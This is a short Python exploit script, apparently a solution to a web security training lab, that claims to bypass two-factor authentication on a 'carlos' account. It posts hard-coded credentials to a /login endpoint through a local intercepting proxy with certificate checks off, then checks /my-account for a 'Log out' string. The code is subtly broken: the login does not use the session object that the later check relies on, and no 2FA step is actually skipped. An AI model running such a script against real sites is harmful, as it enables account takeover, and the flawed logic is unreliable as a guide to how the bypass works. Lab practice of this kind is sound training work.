import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def access_carlos_account(s, url):
    # Log into Carlos's account
    print("(+) Logging into Carlos's account and bypassing 2FA verification...")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "montoya"}
    print("login_url", login_url)
    print("login_data", login_data)
    r = requests.post(login_url, data=login_data,
                      allow_redirects=False, verify=False, proxies=proxies)
    if r.status_code == 200:
        print('Login successful!')
    else:
        print('Login failed.')

    # Confirm bypass
    myAccount_url = url + "/my-account"
    print("myAccount_url", myAccount_url)

    r = s.get(myAccount_url, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("(+) Successfully bypassed 2FA verification")
    else:
        print("(+) Exploit failed")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)


proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}
if __name__ == '__main__':
    main()
